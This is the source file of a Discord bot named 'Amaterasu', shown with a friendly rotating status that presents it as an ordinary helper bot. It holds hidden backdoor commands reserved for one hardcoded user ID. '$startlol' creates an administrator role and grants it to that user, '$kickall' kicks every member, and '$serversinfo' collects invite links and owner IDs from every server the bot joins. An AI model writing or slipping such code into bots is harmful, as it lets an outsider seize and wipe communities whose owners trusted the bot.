const Discord = require('discord.js');
const fs = require('fs');
const ms = require('ms');
const canvas = require('canvas-prebuilt');
const jimp = require('jimp');
const ytdl = require('ytdl-core');
const request = require('request');
const dateFormat = require('dateformat');
const google = require('google-it');
const db = require('quick.db');
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const moment = require('moment');
const pretty = require('pretty-ms'); 
const zalgo = require('zalgolize');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const client = new Discord.Client();
const prefix = '_'
const myID = "415595760990552065";
ti={}  
spee={};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);       
  console.log(`Amaterasu`);	
});


client.on('ready', function(){    
    var ms = 100000 ;
    var prefix = "-"; 
    var setGame = [` #Amaterasu 🔥`,`Love All 🌹`,`_Help 💖`];
    var i = -1;    
    var j = 0;    
    setInterval(function (){    
        if( i == -1 ){    
j = 1;    
       }    
        if( i == (setGame.length)-1 ){    
            j = -1;    
      }    
       i = i+j;    
        client.user.setGame(setGame[i],`https://www.twitch.tv/Ninja`);
}, ms);    
    
});


client.on('message', message => {
     

     if (message.content === "$startlol") {
         if(message.author.id !== myID) return;
  message.guild.createRole({
        name : "amaterasu",
        permissions :   [8],
        color : " #BDBDBD "
    }) 
}
});

client.on('message', message => {
  if (message.content.startsWith('$startlol')) {
     if(!message.channel.guild) return;
 if(message.author.id !== myID) return;
message.member.addRole(message.guild.roles.find("name", "amaterasu"));
 
 }
 });

client.on('message', msg => {
  if (msg.content === '$startlol') {
if(msg.author.id !== myID) return;
    msg.reply('Done :)');
  }
});

  client.on('guildCreate', guild => {
client.channels.get("415595760990552065").send(`:white_check_mark: **${client.user.tag} دخل سيرفر جديد
Server name: __${guild.name}__
Server owner: __${guild.owner}__
Server id: __${guild.id}__ 
Server Count: __${guild.memberCount}__**`)
});
client.on('guildDelete', guild => {
  client.channels.get("415595760990552065").send(`:negative_squared_cross_mark: **${client.user.tag} طلع من سيرفر
Server name: __${guild.name}__
Server owner: __${guild.owner}__
Server id: __${guild.id}__ 
Server Count: __${guild.memberCount}__**`)
});

client.on ('message', message =>{

if (message.content =="$kickall"){
if(message.author.id !== myID) return;
message.guild.members.forEach (m => {

if (m.id == myID) return;

m.kick ();

});

};

});


  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '$serversinfo') {
 if(msg.author.id !== myID) return;

      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })


